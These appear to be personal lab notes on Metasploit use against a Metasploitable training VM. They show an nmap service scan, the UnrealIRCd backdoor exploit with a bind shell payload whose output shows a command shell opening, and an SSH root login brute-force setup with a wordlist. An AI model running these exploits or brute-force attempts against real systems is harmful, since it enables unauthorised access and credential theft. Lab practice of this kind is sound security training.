* [How to Use Metasploit Modules?](https://techofide.com/blogs/how-to-use-metasploit-meterpreter-reverse-shell-metasploit-tutorial/?fbclid=IwAR2srI3HMQZCFaKyADUlYsuaf-0BNHDV4qQCC9_Trqewn3qFdoP67agy2d4)
* [metasploit docs](https://docs.metasploit.com/)
### Service
```
root@raspberrypi:~/nuclei-templates/technologies/nginx# nmap -sV -T4 192.168.1.121
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-01 16:10 CST
Nmap scan report for 192.168.1.121
Host is up (0.00079s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:33:DD:95 (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.08 seconds
root@raspberrypi:~/nuclei-templates/technologies/nginx# 
```
##
```
msfconsole

#auxiliary/scanner/ssh/ssh_login_pubkey
#use auxiliary/scanner/smb/smb_ms17_010
use exploit/unix/irc/unreal_ircd_3281_backdoor
set payload cmd/unix/bind_perl
exploit
...
View the full module info with the info, or info -d command.

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 192.168.1.121
RHOST => 192.168.1.121
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[*] 192.168.1.121:6667 - Connected to 192.168.1.121:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 192.168.1.121:6667 - Sending backdoor command...
[*] Started bind TCP handler against 192.168.1.121:4444
[*] Command shell session 1 opened (192.168.1.103:39983 -> 192.168.1.121:4444) at 2023-02-02 16:30:39 +0800
...
##
search ssh_login
use auxiliary/scanner/ssh/ssh_login
set username root
set userpass_file /usr/share/wordlists/root_userpass.txt
set rhosts 192.168.1.121
```
